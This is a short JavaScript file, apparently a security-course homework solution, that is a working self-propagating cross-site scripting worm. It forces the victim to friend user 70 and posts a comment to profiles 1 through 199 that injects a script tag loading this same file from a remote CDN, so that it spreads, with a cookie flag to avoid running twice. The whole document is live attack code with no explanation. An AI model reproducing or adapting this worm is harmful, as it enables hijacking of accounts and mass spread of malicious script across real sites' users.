const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
if(cookies.get("xssed") != "yes"){
	var xhx = new XMLHttpRequest();
	xhx.open("GET", `/add_friend.php?id=70`,true);
	xhx.send();
	for(var i = 1; i < 200; i++){
		var id = i;
		var payload = encodeURIComponent("<script src=\"https://cdn.jsdelivr.net/gh/ajc9076/csec380-hw6/malware.js\"></script>");
		var xhy = new XMLHttpRequest();
		xhy.open("GET", `/add_comment.php?id=${id}&comment=${payload}`,true);
		xhy.send();
	};
}
document.cookie = "xssed=yes"